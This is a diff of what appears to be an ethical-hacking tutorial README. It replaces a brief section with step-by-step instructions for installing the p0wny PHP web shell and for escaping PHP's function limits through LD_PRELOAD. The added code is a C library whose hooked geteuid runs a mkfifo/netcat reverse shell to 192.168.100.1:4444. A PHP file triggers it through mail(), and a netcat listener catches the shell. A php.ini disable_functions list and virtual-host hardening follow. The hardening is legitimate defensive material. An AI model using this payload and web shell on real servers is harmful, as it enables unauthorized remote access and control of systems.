@@ -37,9 +37,9 @@ Legal and Authorized: Ethical hackers operate with permission from the organizat
   * [SSL Strip \(Downgrade HTTPS to HTTP)](#SSL-Strip-(Downgrade-HTTPS-to-HTTP))
   * [Xerosploit](#Xerosploit)
 * [PHP Shell](#PHP-Shell)
-  * [Bypass-LD](#Bypass-LD)
-  * [NetCat](#NetCat)
-  * [Harderning PHP Shell](#Harderning-PHP-Shell)
+  * [PHP Shell](#PHP-Shell)
+  * [Privilege Escalation](#Privilege-Escalation)
+  * [Harderning PHP](#Harderning-PHP)
 * [Additional Resources](#Additional-Resources)
   * [Ebook / Manuals](#Ebook-/-Manuals)
 
@@ -270,39 +270,71 @@ ctrl + c -> stop
 ```
 
 # PHP Shell
-## Bypass-LD 
-Build (File in Repository)
-
-Source : https://github.com/flozz/p0wny-shell
+## PHP Shell
+Trial Install (Case Apache2)
 ```
-nano /var/www/html/hacking.c
-gcc -c -fPIC hacking.c -o hacking
-gcc -shared hacking -o hacking.so
+apt install apache2
+apt install php
 ```
-BadConnect 
+Create shell.php
 ```
-nano /var/www/html/hacking.php
+nano /var/www/html/shell.php
+---------------------------
+Copy Raw. Source : https://github.com/flozz/p0wny-shell/shell.php
 ```
-## NetCat
+Testing PHP Shell
 ```
-nc -v -l -p [PORT]
+Access to Browser : http://192.168.xx.xx/shell.php
 ```
-## Harderning PHP Shell
-Harderning PHP
+## Privilege Escalation
+Step 1. Create Payload
 ```
-#edit php.ini
-#cd /etc/php/8.3/apache2/php.ini
+nano /var/www/html/hack.c
+---------------------------
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+void payload() {
+system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.1 4444 >/tmp/f");
+}
+int geteuid() {
+if (getenv("LD_PRELOAD") == NULL) { return 0; }
+unsetenv("LD_PRELOAD");
+payload();
+}
+```
+Step 2. Copy to Shell
+```
+gcc -c -fPIC hack.c -o hack
+gcc -shared hack -o hack.so
+```
+Step 3. Create hack.php
+```
+nano /var/www/html/hack.php
+---------------------------
+<?php
+putenv("LD_PRELOAD=/var/www/html/hack.so");
+mail("@localhost","","","","");
+?>
+```
+Step 4. Netcat
+```
+nc -v -l -p 4444
+```
+## Harderning PHP
+Harderning php.ini
+```
+nano /etc/php/8.3/apache2/php.ini
+---------------------------
 #disable_function
-
-disable_functions = curl_multi_exec, popen, passthru, exec, popen, symlink, proc_open, shell_exec, show_source, allow_url_fopen, system, passthru, parse_ini_file, show_source, exec, proc_open, php_uname, posix_getpwuid, setenv, main, apache_setenv, putenv, mail, link, mb_send_mail,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,phpinfo
-
-#putenv
+disable_functions = curl_multi_exec, popen, passthru, exec, popen, symlink, proc_open, shell_exec, show_source, allow_url_fopen, system, passthru, parse_ini_file, show_source, exec, proc_open, php_uname, posix_getpwuid, setenv, main, apache_setenv, putenv, mail, link, mb_send_mail,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,phpinfo,putenv
 #open_basedir
 open_basedir = /var/www/html
 ```
 Harderning Virtual Host
 ```
-#VirtualHost_Configuration
+nano domain.conf
+---------------------------
 <VirtualHost *:80>
     ServerAdmin [DOMAIN_SAMPLE]
     ServerName [DOMAIN_SAMPLE]
@@ -331,6 +363,7 @@ Harderning Virtual Host
         php_admin_value upload_tmp_dir /home/[DOMAIN_SAMPLE]
         </Directory>
 </VirtualHost>
+---------------------------
 ```
 
 # Additional Resources
